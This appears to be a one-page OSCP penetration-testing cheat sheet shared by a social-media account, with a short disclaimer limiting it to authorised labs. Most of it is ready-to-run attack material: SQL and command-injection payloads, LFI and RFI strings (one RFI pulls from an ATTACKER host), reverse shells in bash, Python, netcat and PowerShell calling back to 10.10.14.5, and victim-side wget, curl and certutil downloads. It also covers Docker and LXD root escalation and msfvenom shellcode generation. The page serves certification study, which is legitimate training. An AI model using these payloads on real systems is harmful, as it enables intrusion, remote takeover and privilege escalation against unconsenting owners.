# 🎯 OSCP CHEAT SHEET - ONE PAGE GOLD

**@3diklab | Pack 1000 Subs**

> **DISCLAIMER**: Uso ÉTICO únicamente. Autorización escrita requerida. HTB/OSCP labs OK.

---

## 🔍 RECONNAISSANCE

### Port Scanning
```bash
# Quick scan (top 1000 ports)
nmap -sV -sC -oA nmap/initial 10.10.10.5

# Full scan (all ports)
nmap -p- --min-rate 5000 -oA nmap/full 10.10.10.5

# UDP scan (common ports)
nmap -sU --top-ports 100 10.10.10.5

# Using luvliscan (adaptive scanner)
./luvliscan 10.10.10.5 MachineName
```

### Directory Enumeration
```bash
gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak
ffuf -u http://10.10.10.5/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
```

---

## 🌐 WEB ATTACKS

### SQL Injection
```bash
' OR 1=1-- -
admin' OR '1'='1
' UNION SELECT NULL,NULL,NULL-- -
```

### LFI/RFI
```bash
# LFI - /etc/passwd
http://10.10.10.5/index.php?page=../../../../etc/passwd

# PHP Filter (base64)
http://10.10.10.5/index.php?page=php://filter/convert.base64-encode/resource=index.php

# RFI
http://10.10.10.5/index.php?page=http://ATTACKER/shell.txt
```

### Command Injection
```bash
; id
| id
& id
`id`
$(id)
```

---

## 🔴 REVERSE SHELLS

### Listener (Attacker)
```bash
nc -lvnp 4444
```

### Shells (Victim)
```bash
# Bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Netcat
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.5 4444 >/tmp/f

# PowerShell (Windows)
powershell -nop -c "$client=New-Object System.Net.Sockets.TCPClient('10.10.14.5',4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### TTY Upgrade
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
# Enter x2
export TERM=xterm
export SHELL=bash
```

---

## 🔐 LINUX PRIVILEGE ESCALATION

### Quick Wins
```bash
# SUDO
sudo -l

# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Writable /etc/passwd
ls -la /etc/passwd

# Cron jobs
cat /etc/crontab
ls -la /etc/cron*
```

### Automated Tools
```bash
./linpeas.sh
./linenum.sh
./privesc_check.sh  # (Incluido en este pack)
```

### Common Exploits
```bash
# Docker group
docker run -v /:/mnt --rm -it alpine chroot /mnt bash

# LXD group
lxd init
lxc init ubuntu:18.04 privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/bash
```

---

## 🪟 WINDOWS PRIVILEGE ESCALATION

### Enumeration
```powershell
# System info
systeminfo
whoami /priv
whoami /groups

# Installed software
wmic product get name,version

# Running services
wmic service list brief
```

### Quick Wins
```powershell
# Check for unquoted service paths
wmic service get name,pathname,startmode | findstr /i auto | findstr /i /v "C:\Windows"

# Check for AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer

# Stored credentials
cmdkey /list
```

### Automated Tools
```powershell
.\winPEAS.exe
.\PowerUp.ps1; Invoke-AllChecks
```

---

## 📁 FILE TRANSFER

### Python HTTP Server (Attacker)
```bash
python3 -m http.server 8000
```

### Download Files (Victim)
```bash
# Linux - wget
wget http://10.10.14.5:8000/linpeas.sh

# Linux - curl
curl http://10.10.14.5:8000/linpeas.sh -o linpeas.sh

# Windows - PowerShell
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.5:8000/winPEAS.exe','winPEAS.exe')"

# Windows - certutil
certutil -urlcache -f http://10.10.14.5:8000/winPEAS.exe winPEAS.exe
```

### Netcat Transfer
```bash
# Receiver
nc -lvnp 4444 > file

# Sender
nc 10.10.14.5 4444 < file
```

---

## 🌐 PIVOTING & TUNNELING

### SSH Tunneling
```bash
# Local Port Forward (access internal port from attacker)
ssh -L 8080:localhost:80 user@10.10.10.5

# Remote Port Forward (expose attacker port to internal network)
ssh -R 8080:localhost:80 user@10.10.10.5

# Dynamic Port Forward (SOCKS proxy)
ssh -D 9050 user@10.10.10.5
# Then: proxychains nmap -sT 172.16.1.10
```

### Chisel (without SSH)
```bash
# Attacker
./chisel server -p 8000 --reverse

# Victim
./chisel client 10.10.14.5:8000 R:8080:127.0.0.1:80
```

---

## 🛡️ BUFFER OVERFLOW (x86 32-bit)

### Methodology
```python
1. Fuzzing       → Find crash point
2. EIP Control   → Pattern create/offset
3. Bad Chars     → Test \x00-\xFF
4. Find JMP ESP  → !mona jmp -r esp
5. Generate      → msfvenom payload
6. Exploit       → NOP sled + shellcode
```

### Msfvenom Payload
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f c -b "\x00\x0a\x0d" EXITFUNC=thread
```

---

## 📖 OSCP METHODOLOGY

```
┌─────────────────────────────────────────┐
│ 1. RECONNAISSANCE                       │
│    → nmap, gobuster, nikto              │
├─────────────────────────────────────────┤
│ 2. ENUMERATION                          │
│    → Services, versions, misconfigs     │
├─────────────────────────────────────────┤
│ 3. EXPLOITATION                         │
│    → Searchsploit, metasploit, manual   │
├─────────────────────────────────────────┤
│ 4. POST-EXPLOITATION                    │
│    → Enumeration script (privesc_check) │
├─────────────────────────────────────────┤
│ 5. PRIVILEGE ESCALATION                 │
│    → SUDO, SUID, capabilities, kernel   │
├─────────────────────────────────────────┤
│ 6. PERSISTENCE (if needed)              │
│    → SSH keys, backdoors (LAB ONLY)     │
└─────────────────────────────────────────┘
```

---

## 💡 TIPS

- **Take breaks**: OSCP is a marathon, not a sprint.
- **Document everything**: Screenshots + commands in notes.
- **Try Harder™**: Enumerate harder before using Metasploit.
- **Use GTFOBins**: https://gtfobins.github.io/
- **Check PayloadsAllTheThings**: https://github.com/swisskyrepo/PayloadsAllTheThings

---

## 🔗 RECURSOS

| Resource | URL |
|----------|-----|
| GTFOBins | https://gtfobins.github.io/ |
| RevShells | https://www.revshells.com/ |
| HackTricks | https://book.hacktricks.xyz/ |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
| ExploidDB | https://www.exploit-db.com/ |
| CyberChef | https://gchq.github.io/CyberChef/ |

---

**🕶️ @3diklab | Pack 1000 Subs | Good Luck!**
